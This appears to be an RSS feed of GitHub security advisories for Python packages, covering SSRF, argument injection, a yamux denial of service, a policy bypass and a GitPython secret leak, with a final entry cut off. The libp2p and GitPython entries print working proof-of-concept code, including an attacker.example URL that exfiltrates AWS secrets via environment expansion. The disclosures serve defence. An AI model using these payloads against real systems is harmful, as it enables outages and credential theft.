<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-07-28T12:29:14.775Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[nanobot-ai] Nanobot contains a server-side request forgery vulnerability in the web_fetch tool]]></title>
        <id>https://github.com/advisories/GHSA-434r-7c99-hwf3</id>
        <link href="https://github.com/advisories/GHSA-434r-7c99-hwf3"/>
        <updated>2026-07-27T16:02:27.000Z</updated>
        <content type="html"><![CDATA[<p>Nanobot prior to version 0.2.1 contains a server-side request forgery vulnerability in the web_fetch tool that allows remote attackers to reach internal or private network hosts by supplying a URL that redirects to a loopback or private address via a 3xx Location header. Attackers can exploit the automatic HTTP redirect following behavior in the httpx library to bypass initial URL validation and cause the runtime to send outbound requests to internal hosts before final resolved URL validation is applied.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49138">https://nvd.nist.gov/vuln/detail/CVE-2026-49138</a></li>
<li><a href="https://github.com/HKUDS/nanobot/pull/3928">https://github.com/HKUDS/nanobot/pull/3928</a></li>
<li><a href="https://github.com/HKUDS/nanobot/commit/545294c62c0947da40eb5b65288aaf02b5fdf632">https://github.com/HKUDS/nanobot/commit/545294c62c0947da40eb5b65288aaf02b5fdf632</a></li>
<li><a href="https://github.com/HKUDS/nanobot/releases/tag/v0.2.1">https://github.com/HKUDS/nanobot/releases/tag/v0.2.1</a></li>
<li><a href="https://www.vulncheck.com/advisories/nanobot-ssrf-via-web-fetch-tool-redirect-following">https://www.vulncheck.com/advisories/nanobot-ssrf-via-web-fetch-tool-redirect-following</a></li>
<li><a href="https://github.com/advisories/GHSA-434r-7c99-hwf3">https://github.com/advisories/GHSA-434r-7c99-hwf3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-434r-7c99-hwf3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-01T21:30:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bedrock-agentcore] AWS Bedrock AgentCore: Improper neutralization of argument delimiters in the Python SDK install_packages()]]></title>
        <id>https://github.com/advisories/GHSA-j6g5-3hh3-pgw8</id>
        <link href="https://github.com/advisories/GHSA-j6g5-3hh3-pgw8"/>
        <updated>2026-07-24T22:38:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The AWS Bedrock AgentCore Python SDK (bedrock-agentcore) provides tools for building AI agents, including a Code Interpreter client that installs Python packages into a managed sandbox. An issue exists where, under certain circumstances, improper neutralization of argument delimiters in the install_packages() method allows a remote authenticated user to execute arbitrary commands within the Code Interpreter sandbox via crafted package name arguments.</p>
<h3 id="impact">Impact</h3>
<p>Insufficient input validation in install_packages() allows specially crafted package specifiers to bypass validation and achieve arbitrary command execution within the sandbox. A remote authenticated user who can influence the arguments to install_packages() can execute arbitrary commands within the Code Interpreter sandbox environment.</p>
<h3 id="impacted-versions">Impacted Versions</h3>
<p>&lt; 1.18.1</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in bedrock-agentcore version 1.18.1. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you are not able to upgrade, do not pass untrusted or model-generated input to install_packages(). Applications that must accept dynamic package names should validate them against strict PyPI naming rules -- including constraining any extras group to comma-separated identifiers -- before calling the SDK.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory, AWS asks that you contact AWS Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>AWS would like to thank Sergio Garcia (@MrCloudSec) for collaborating on this issue through the coordinated issue disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/bedrock-agentcore-sdk-python/security/advisories/GHSA-j6g5-3hh3-pgw8">https://github.com/aws/bedrock-agentcore-sdk-python/security/advisories/GHSA-j6g5-3hh3-pgw8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-16796">https://nvd.nist.gov/vuln/detail/CVE-2026-16796</a></li>
<li><a href="https://github.com/aws/bedrock-agentcore-sdk-python/pull/581">https://github.com/aws/bedrock-agentcore-sdk-python/pull/581</a></li>
<li><a href="https://github.com/aws/bedrock-agentcore-sdk-python/commit/3c4b4ee6b8730e6313a82c743ac37dbcc1c21cdb">https://github.com/aws/bedrock-agentcore-sdk-python/commit/3c4b4ee6b8730e6313a82c743ac37dbcc1c21cdb</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-065-aws">https://aws.amazon.com/security/security-bulletins/2026-065-aws</a></li>
<li><a href="https://pypi.org/project/bedrock-agentcore/1.18.1">https://pypi.org/project/bedrock-agentcore/1.18.1</a></li>
<li><a href="https://github.com/advisories/GHSA-j6g5-3hh3-pgw8">https://github.com/advisories/GHSA-j6g5-3hh3-pgw8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j6g5-3hh3-pgw8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T22:38:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[libp2p] libp2p: yamux connection DoS via oversized data frame]]></title>
        <id>https://github.com/advisories/GHSA-hmj8-5xmh-5573</id>
        <link href="https://github.com/advisories/GHSA-hmj8-5xmh-5573"/>
        <updated>2026-07-24T22:37:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The yamux stream multiplexer in py-libp2p does not validate incoming DATA frame lengths against the receive window before reading the frame body. Any peer that completes a standard libp2p handshake can send a single 12-byte frame claiming a 4 GB body, causing the victim's yamux read loop to block indefinitely. This affects the default <code>new_host()</code> configuration and requires no special setup on either side.</p>
<h3 id="details">Details</h3>
<p>In <code>libp2p/stream_muxer/yamux/yamux.py</code> (lines 915 to 926), the <code>handle_incoming()</code> method dispatches on frame type. When a DATA frame arrives, it reads the body unconditionally:</p>
<pre><code class="language-python">elif typ == TYPE_DATA:
    try:
        data = (
            await read_exactly(self.secured_conn, length)
            if length &gt; 0
            else b""
        )
</code></pre>
<p>The <code>length</code> field is taken directly from the wire-decoded frame header, a 32-bit unsigned integer with a maximum value of 4,294,967,295. There is no check that <code>length</code> fits within the stream's receive window (<code>DEFAULT_WINDOW_SIZE = 256 * 1024</code> bytes). The body read also happens before the code checks whether the referenced <code>stream_id</code> even exists in <code>self.streams</code> (that check is at line 954), so any stream ID triggers the issue.</p>
<p><code>handle_incoming()</code> itself is a single sequential loop with no timeout around the body read. Once <code>read_exactly</code> suspends waiting for data that never comes, the loop cannot process any subsequent frames. Every stream on that yamux connection stops working, and no exception is raised.</p>
<p>The same unguarded call appears in the SYN branch at lines 804 to 806, so a crafted SYN frame with a large length field triggers the same stall.</p>
<p>The yamux specification (section 3.3) explicitly requires the receiver to reset the stream if a sender transmits more data than the receive window allows. py-libp2p does not enforce this on the receiver side. All three comparable implementations do: go-yamux tracks <code>recvWindow</code> per stream and returns a <code>SendWindowExceeded</code> error on violation; rust-yamux validates frame length against the stream credit; js-libp2p yamux checks frame length against <code>maxMessageSize</code>.</p>
<h3 id="poc">PoC</h3>
<p>The harness completes a normal noise handshake and yamux negotiation between two local hosts, confirms yamux is healthy with a pre-attack ping, then writes a single malicious frame directly to the attacker's secured connection. After a short pause, it attempts to open a new stream with a 3-second deadline. The stream open never completes.</p>
<p>File: test_poc.py</p>
<pre><code class="language-python">"""
author: @tahaafarooq
POC: yamux connection DoS via oversized data frame (connection DoS)
"""
import os
import secrets
import gc
import struct

import psutil
import trio
import multiaddr

from libp2p import new_host
from libp2p.crypto.ed25519 import create_new_key_pair
from libp2p.custom_types import TProtocol
from libp2p.peer.peerinfo import PeerInfo
from libp2p.stream_muxer.yamux.yamux import Yamux

LOOPBACK = multiaddr.Multiaddr("/ip4/127.0.0.1/tcp/0")
PING = TProtocol("/audit/ping/1.0.0")

YAMUX_HEADER_FORMAT = "!BBHII"
TYPE_DATA = 0x0
HUGE_LENGTH = 0xFFFF_FFFF  # max uint32 — 4,294,967,295 bytes


def craft_malicious_frame(stream_id: int = 1) -&gt; bytes:
    """
    12-byte yamux DATA frame with flags=0 and length=4 GB.
    The stream_id is irrelevant: yamux reads the body BEFORE checking
    whether the stream exists.
    """
    return struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, 0, stream_id, HUGE_LENGTH)


def _get_yamux(host, peer_id) -&gt; Yamux | None:
    swarm = host.get_network()
    conns = swarm.connections.get(peer_id)
    if conns is None:
        return None
    conn = conns[0] if isinstance(conns, list) else conns
    mc = conn.muxed_conn
    return mc if isinstance(mc, Yamux) else None


async def attack():
    proc = psutil.Process(os.getpid())
    rss0 = proc.memory_info().rss

    v_kp = create_new_key_pair(secrets.token_bytes(32))
    a_kp = create_new_key_pair(secrets.token_bytes(32))

    # DEFAULT new_host() — noise + yamux — no explicit sec_opt or muxer_opt
    victim = new_host(key_pair=v_kp)
    attacker = new_host(key_pair=a_kp)

    victim.set_stream_handler(PING, lambda s: s.close())

    async with victim.run(listen_addrs=[LOOPBACK]):
        vaddr = victim.get_addrs()[0]
        assert "127.0.0.1" in str(vaddr), "SAFETY: non-loopback"
        print(f"[*] Victim   : {vaddr}")
        print(f"[*] Config   : DEFAULT (noise + yamux)")

        async with attacker.run(listen_addrs=[LOOPBACK]):
            await attacker.connect(PeerInfo(victim.get_id(), victim.get_addrs()))
            await trio.sleep(0.2)

            a_yamux = _get_yamux(attacker, victim.get_id())
            v_yamux = _get_yamux(victim, attacker.get_id())
            assert a_yamux and v_yamux, "yamux muxed_conn not found"
            print(
                f"[*] Muxer    : attacker={type(a_yamux).__name__}, "
                f"victim={type(v_yamux).__name__}"
            )

            # --- Pre-attack: confirm yamux is healthy ---
            pre_stream = await attacker.new_stream(victim.get_id(), [PING])
            await pre_stream.close()
            print("[*] Pre-attack ping: OK (yamux live)")

            # --- Inject malicious frame ---
            frame = craft_malicious_frame(stream_id=1)
            print(
                f"[*] Injecting {len(frame)}-byte yamux frame: "
                f"type=DATA flags=0x0 stream_id=1 length={HUGE_LENGTH:#010x} "
                f"({HUGE_LENGTH:,} bytes)"
            )
            print(f"[*] Frame hex: {frame.hex()}")

            # Write directly to the noise-encrypted secure conn.
            # secured_conn.write() encrypts before sending; victim decrypts and
            # sees the raw yamux frame bytes, which handle_incoming processes.
            await a_yamux.secured_conn.write(frame)
            await trio.sleep(0.2)
            # Victim's handle_incoming has now read the 12-byte header, dispatched
            # to `elif typ == TYPE_DATA:`, and entered read_exactly(conn, 4GB).

            # --- Post-attack: try to use yamux ---
            post_attack_succeeded = False

            with trio.move_on_after(3.0):
                try:
                    post_stream = await attacker.new_stream(victim.get_id(), [PING])
                    await post_stream.close()
                    post_attack_succeeded = True
                except Exception as e:
                    print(f"[*] Post-attack new_stream error: {type(e).__name__}: {e}")

            gc.collect()
            rss1 = proc.memory_info().rss

            print("\n=== RESULTS ===")
            print(f"Injected frame (hex) : {frame.hex()}")
            print(
                f"Body-length field    : {HUGE_LENGTH} bytes requested, 0 bytes sent"
            )
            print(f"Post-attack ping OK  : {post_attack_succeeded}")
            print(f"RSS delta            : {(rss1 - rss0) / 1024:.1f} KiB")

            yamux_stuck = not post_attack_succeeded
            print(f"\nVictim yamux loop stuck: {yamux_stuck}")

            if yamux_stuck:
                print(
                    "[CONFIRMED] handle_incoming blocked - victim yamux dead for "
                    "this connection."
                )
                print(
                    "[IMPACT   ] Single 12-byte write from any authenticated peer "
                    "(post-noise-handshake)\n"
                    "            permanently stalls yamux for that connection.\n"
                    "            Affects DEFAULT new_host() config - no mplex required.\n"
                    "            No timeout, no max-length check, no exception."
                )
            else:
                print("[NOT CONFIRMED] yamux responded post-attack.")

            assert yamux_stuck, (
                "Expected yamux to be stuck after injecting malicious DATA frame, "
                "but connection remained functional."
            )


def test_yamux_data_frame_stall():
    trio.run(attack)


if __name__ == "__main__":
    trio.run(attack)
</code></pre>
<pre><code>python3 -m pytest test_poc.py::test_yamux_data_frame_stall -v
</code></pre>
<p>Malicious frame (12 bytes, hex): <code>00000000000000 01ffffffff</code></p>
<pre><code>version  = 0x00
type     = 0x00  (DATA)
flags    = 0x0000
stream_id= 0x00000001
length   = 0xFFFFFFFF  (4,294,967,295 bytes)
</code></pre>
<p>Output:</p>
<pre><code>[*] Config   : DEFAULT (noise + yamux)
[*] Pre-attack ping: OK (yamux live)
[*] Injecting 12-byte yamux frame: type=DATA flags=0x0 stream_id=1 length=0xffffffff
Victim yamux loop stuck: True
[CONFIRMED] handle_incoming blocked - victim yamux dead for this connection.
PASSED in ~3.8s
</code></pre>
<h3 id="impact">Impact</h3>
<p>A single authenticated peer (one that has completed the noise handshake, which requires no credentials) can permanently freeze the yamux read loop for a given connection using 12 bytes of payload. All streams on that connection stop working. No exception is raised, no log entry is written, and no automatic recovery occurs.</p>
<p>This applies to the default <code>new_host()</code> configuration. Unlike a similar issue in the mplex muxer (which requires an explicit opt-in), every py-libp2p node using the standard setup is affected. At the default connection limit of 10,000 connections, an attacker running 10,000 peers can freeze all connections using roughly 120 KB of total traffic.</p>
<p>There is no confidentiality or integrity impact. The effect is limited to availability on the targeted yamux connection.</p>
<h3 id="remediation">Remediation</h3>
<p><strong>1. Enforce the receive window on inbound DATA frames</strong> (primary fix)
Before calling <code>read_exactly</code>, reject frames whose declared length exceeds the negotiated receive window:</p>
<pre><code class="language-python"># libp2p/stream_muxer/yamux/yamux.py
                                                                                                           
MAX_YAMUX_FRAME = 256 * 1024  # matches DEFAULT_WINDOW_SIZE and go-yamux default
                                                     
elif typ == TYPE_DATA:
    if length &gt; MAX_YAMUX_FRAME:
        logger.warning(
            f"yamux: oversized DATA frame length={length} &gt; {MAX_YAMUX_FRAME}, sending RST"
        )
        rst_header = struct.pack(YAMUX_HEADER_FORMAT, 0, TYPE_DATA, FLAG_RST, stream_id, 0)
        await self.secured_conn.write(rst_header)
        continue  # skip body read; loop processes next frame
    data = await read_exactly(self.secured_conn, length) if length &gt; 0 else b""
</code></pre>
<p>The same check should be applied to the SYN branch at lines 804 to 806.</p>
<p><strong>2. Add a per-frame timeout in <code>handle_incoming()</code></strong></p>
<pre><code class="language-python">while not self.event_shutting_down.is_set():
    try:
        with trio.fail_after(60):
            header = await read_exactly(self.secured_conn, HEADER_SIZE)
            ...
    except trio.TooSlowError:
        logger.warning("yamux: frame read timed out, closing connection")
        self.event_shutting_down.set()
        break
</code></pre>
<p>Option 1 eliminates the amplification entirely. Option 2 bounds the worst-case stall duration for any future oversized-read path that might be introduced.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573">https://github.com/libp2p/py-libp2p/security/advisories/GHSA-hmj8-5xmh-5573</a></li>
<li><a href="https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37">https://github.com/libp2p/py-libp2p/commit/146ea87d1a20cc7dacf684ecf7c204543be04b37</a></li>
<li><a href="https://github.com/advisories/GHSA-hmj8-5xmh-5573">https://github.com/advisories/GHSA-hmj8-5xmh-5573</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hmj8-5xmh-5573</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T22:37:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[awslabs.aws-api-mcp-server] AWS API MCP Server Security Policy Bypass via Startup Initialization Failure]]></title>
        <id>https://github.com/advisories/GHSA-29w2-fq35-v728</id>
        <link href="https://github.com/advisories/GHSA-29w2-fq35-v728"/>
        <updated>2026-07-24T22:33:23.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The AWS API MCP Server is an open source Model Context Protocol (MCP) server that enables AI assistants to interact with AWS services and resources through AWS CLI commands. It provides programmatic access to manage your AWS infrastructure while maintaining proper security controls. It includes an optional, user-configured security policy that can deny or gate specific AWS operations. An issue exists where, if the data used to enforce this policy fails to initialize at server startup, the per-request policy check is silently skipped for the lifetime of the process.</p>
<h3 id="impact">Impact</h3>
<p>On startup, the server loads data used to enforce the configured security policy. If that load fails, the server continues running without the enforcement data in place. In the default configuration, the per-request security check is then bypassed for the lifetime of the process: configured deny and gate rules are not consulted, and AWS API operations the policy was intended to restrict execute without enforcement. The scope is limited to the security-policy gate; IAM permissions on the configured credentials remain in effect and continue to bound what the server can do.</p>
<p><strong>Impacted versions</strong>: &gt;= 0.2.13 AND &lt; 1.3.47</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in awslabs.aws-api-mcp-server version 1.3.47. AWS recommends upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Any one of the following prevents the bypass until you can upgrade:</p>
<ul>
<li>Use least-privilege IAM credentials (for example, a ReadOnlyAccess role) scoped to the task. IAM remains the primary access control and is enforced regardless of this issue.</li>
<li>If the server started during degraded connectivity, restart it once connectivity is restored so the policy enforcement data loads successfully.</li>
</ul>
<h3 id="contact">Contact</h3>
<p>If you have any questions or comments about this advisory, AWS asks that you contact AWS Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>We would like to thank Lav Kumar Vishwakarma (independent security researcher) for collaborating on this issue through the coordinated vulnerability disclosure process.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/awslabs/mcp/security/advisories/GHSA-29w2-fq35-v728">https://github.com/awslabs/mcp/security/advisories/GHSA-29w2-fq35-v728</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-16584">https://nvd.nist.gov/vuln/detail/CVE-2026-16584</a></li>
<li><a href="https://github.com/awslabs/mcp/pull/4315">https://github.com/awslabs/mcp/pull/4315</a></li>
<li><a href="https://github.com/awslabs/mcp/commit/ab1bbebc097d674c1cdd4bd75a8f313be18473bf">https://github.com/awslabs/mcp/commit/ab1bbebc097d674c1cdd4bd75a8f313be18473bf</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-063-aws">https://aws.amazon.com/security/security-bulletins/2026-063-aws</a></li>
<li><a href="https://pypi.org/project/awslabs.aws-api-mcp-server/1.3.47">https://pypi.org/project/awslabs.aws-api-mcp-server/1.3.47</a></li>
<li><a href="https://github.com/advisories/GHSA-29w2-fq35-v728">https://github.com/advisories/GHSA-29w2-fq35-v728</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-29w2-fq35-v728</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T22:33:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vantage6] vantage6: Algorithm developer can edit another developer's algorithm that is pending / under review]]></title>
        <id>https://github.com/advisories/GHSA-47w6-gwp4-w6vc</id>
        <link href="https://github.com/advisories/GHSA-47w6-gwp4-w6vc"/>
        <updated>2026-07-24T21:49:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Edit permission lacks ownership check, so another developer could alter metadata that is later trusted by nodes. </p>
<p>Worst they could do is update the image or image tag. If that is not noted, another image is approved than the one actually under review</p>
<h3 id="patches">Patches</h3>
<p>No</p>
<h3 id="workarounds">Workarounds</h3>
<p>No</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vantage6/vantage6/security/advisories/GHSA-47w6-gwp4-w6vc">https://github.com/vantage6/vantage6/security/advisories/GHSA-47w6-gwp4-w6vc</a></li>
<li><a href="https://github.com/advisories/GHSA-47w6-gwp4-w6vc">https://github.com/advisories/GHSA-47w6-gwp4-w6vc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-47w6-gwp4-w6vc</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:49:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[GitPython] GitPython: Environment-variable exfiltration via Repo.create_remote() / Remote.add() URL (incomplete fix of GHSA-rwj8-pgh3-r573)]]></title>
        <id>https://github.com/advisories/GHSA-94p4-4cq8-9g67</id>
        <link href="https://github.com/advisories/GHSA-94p4-4cq8-9g67"/>
        <updated>2026-07-24T21:45:20.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The fix for <a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573">GHSA-rwj8-pgh3-r573</a> stopped <code>Repo.clone_from()</code> from running caller-supplied URLs through <code>os.path.expandvars()</code>, but it guarded only that one caller. <code>Remote.create()</code> — reached from the public <code>Repo.create_remote()</code> and its <code>Remote.add()</code> alias — still passes an attacker-influenceable URL through <code>Git.polish_url()</code> with the default <code>expand_vars=True</code>. A URL such as <code>http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git</code> is expanded server-side to embed the hosting process's environment secret, written into <code>.git/config</code>, and then transmitted to the attacker's host on the next <code>fetch</code>/<code>pull</code>. This is the same primitive and same "import repository from URL" threat model the advisory describes, via the sibling caller the fix missed.</p>
<h2 id="root-cause">Root Cause</h2>
<p>Fix commit <a href="https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2"><code>8ac5a305</code></a> added an <code>expand_vars</code> parameter to <code>Git.polish_url()</code> (default <code>True</code>) and used <code>expand_vars=False</code> only in <code>Repo._clone()</code> (<a href="https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/repo/base.py#L1455"><code>git/repo/base.py:1455</code></a>). The shared helper's dangerous default was left in place, and the other callers were not updated.</p>
<p><a href="https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/remote.py#L811"><code>git/remote.py:811</code></a>, <code>Remote.create</code>:</p>
<pre><code class="language-python">url = Git.polish_url(url)                 # expand_vars=True -&gt; os.path.expandvars(url)
if not allow_unsafe_protocols:
    Git.check_unsafe_protocols(url)       # https:// carrying the secret passes
repo.git.remote(scmd, "--", name, url, **kwargs)   # expanded URL written to .git/config
</code></pre>
<p><code>check_unsafe_protocols()</code> runs <em>after</em> expansion here, so it rejects an <code>ext::</code> payload but does nothing about an <code>https://</code> URL that carries an expanded secret in its path or host — the disclosure primitive.</p>
<p>The same unguarded call also sits at <a href="https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/objects/submodule/base.py#L611"><code>git/objects/submodule/base.py:611</code></a> (<code>Submodule.add</code>), which writes the expanded URL into <code>.gitmodules</code> (a tracked file) and <code>.git/config</code>.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<h3 id="prerequisites">Prerequisites</h3>
<ul>
<li>Python 3.9+</li>
<li><code>git</code> on <code>PATH</code> (for the fetch step)</li>
<li>GitPython 3.1.53 (installed below)</li>
</ul>
<h3 id="step-1-install-gitpython-3153-in-a-clean-venv">Step 1: Install GitPython 3.1.53 in a clean venv</h3>
<pre><code class="language-bash">mkdir /tmp/gp-remote-poc &amp;&amp; cd /tmp/gp-remote-poc
python3 -m venv venv
./venv/bin/pip install gitpython==3.1.53
</code></pre>
<h3 id="step-2-write-the-poc">Step 2: Write the PoC</h3>
<pre><code class="language-bash">cat &gt; poc.py &lt;&lt;'PYEOF'
#!/usr/bin/env python3
"""Env-var exfiltration via Repo.create_remote() URL. Sentinel data only."""
import http.server
import os
import tempfile
import threading

import git

print("gitpython version:", git.__version__)

# Sentinel standing in for a process secret such as AWS_SECRET_ACCESS_KEY.
SENTINEL = "leaked-a1b2c3-SENTINEL-do-not-use"
os.environ["GP_SENTINEL_SECRET"] = SENTINEL

# Local HTTP server standing in for attacker.example.
captured = []


class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        captured.append(self.path)
        self.send_response(404)
        self.end_headers()

    def log_message(self, *a):
        pass


srv = http.server.HTTPServer(("127.0.0.1", 0), Handler)
port = srv.server_address[1]
threading.Thread(target=srv.serve_forever, daemon=True).start()

# Attacker-controlled URL handed to an "import from URL" feature.
attacker_url = "http://127.0.0.1:%d/steal/${GP_SENTINEL_SECRET}/repo.git" % port


def norm(s):  # display the ephemeral listener port as a stable placeholder
    return s.replace("127.0.0.1:%d" % port, "127.0.0.1:PORT")


print("attacker-supplied URL :", norm(attacker_url))

repo = git.Repo.init(tempfile.mkdtemp(prefix="gp-victim-"))
remote = repo.create_remote("evil", attacker_url)   # public API

stored = repo.remote("evil").url
print("stored remote URL     :", norm(stored))
print("SENTINEL in git config:", SENTINEL in stored)

try:
    remote.fetch()          # transmits the expanded URL to the attacker host
except Exception:
    pass                    # fetch fails after the request is already sent

srv.shutdown()
over_network = any(SENTINEL in p for p in captured)
print("HTTP paths received   :", [norm(p) for p in captured])
print("SENTINEL over network :", over_network)

print()
if SENTINEL in stored and over_network:
    print("VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host")
elif SENTINEL in stored:
    print("VULNERABLE: env-var expanded into stored git-config URL")
else:
    print("not reproduced")
PYEOF
</code></pre>
<h3 id="step-3-run-it">Step 3: Run it</h3>
<pre><code class="language-bash">cd /tmp/gp-remote-poc &amp;&amp; ./venv/bin/python poc.py
</code></pre>
<p>Expected output (the listener's ephemeral port is shown as <code>PORT</code>):</p>
<pre><code>gitpython version: 3.1.53
attacker-supplied URL : http://127.0.0.1:PORT/steal/${GP_SENTINEL_SECRET}/repo.git
stored remote URL     : http://127.0.0.1:PORT/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git
SENTINEL in git config: True
HTTP paths received   : ['/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git/info/refs?service=git-upload-pack']
SENTINEL over network : True

VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host
</code></pre>
<p>The <code>${GP_SENTINEL_SECRET}</code> token in the supplied URL is replaced with the environment value both in the stored <code>.git/config</code> URL and in the request that reaches the attacker-controlled host.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Pass <code>expand_vars=False</code> at the remaining URL callers, matching the clone fix:</p>
<ul>
<li><code>git/remote.py</code> <code>Remote.create</code>: <code>url = Git.polish_url(url, expand_vars=False)</code></li>
<li><code>git/objects/submodule/base.py</code> <code>Submodule.add</code>: <code>url = Git.polish_url(url, expand_vars=False)</code></li>
</ul>
<p>More robustly, flip the <code>Git.polish_url()</code> default to <code>expand_vars=False</code> (env-var expansion on a URL is never desirable for network remotes) and require callers that genuinely normalize local paths to opt in.</p>
<h2 id="cleanup">Cleanup</h2>
<pre><code class="language-bash">rm -rf /tmp/gp-remote-poc
</code></pre>
<h2 id="impact">Impact</h2>
<p>Any secret in the hosting process environment (<code>AWS_SECRET_ACCESS_KEY</code>, <code>GITHUB_TOKEN</code>, CI/CD tokens) is disclosed to an attacker who controls a remote URL passed to <code>Repo.create_remote()</code> / <code>Remote.add()</code>. The secret is expanded into <code>.git/config</code> immediately and transmitted over the network (DNS + HTTP) on the next <code>fetch</code>/<code>pull</code>/<code>remote update</code>. This is the documented "import repository from URL" attacker model of GHSA-rwj8-pgh3-r573 — CI servers, git-hosting mirrors, and dependency scanners — applied to the add-a-remote flow, which the clone-only fix did not cover. The same disclosure reaches <code>.gitmodules</code> (a committable file) via <code>Submodule.add()</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-94p4-4cq8-9g67">https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-94p4-4cq8-9g67</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/commit/863417457a0633db7ea5aed4fd01e0b291a41162">https://github.com/gitpython-developers/GitPython/commit/863417457a0633db7ea5aed4fd01e0b291a41162</a></li>
<li><a href="https://github.com/gitpython-developers/GitPython/releases/tag/3.1.55">https://github.com/gitpython-developers/GitPython/releases/tag/3.1.55</a></li>
<li><a href="https://github.com/advisories/GHSA-94p4-4cq8-9g67">https://github.com/advisories/GHSA-94p4-4cq8-9g67</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-94p4-4cq8-9g67</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T21:45:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] open-webui terminal proxy path traversal guard bypass via 9x encoded traversal]]></title>
        <id>https://github.com/advisories/GHSA-frvj-c5qp-xj4w</id>
        <link href="https://github.com/advisories/GHSA-frvj-c5qp-xj4w"/>
        <updated>2026-07-24T21:05:54.000Z</updated>
        <content type="html"><![CDATA[<p>AI assistance was used to help inspect the code and prepare this report.</p>
<h2 id="summary">Summary</h2>
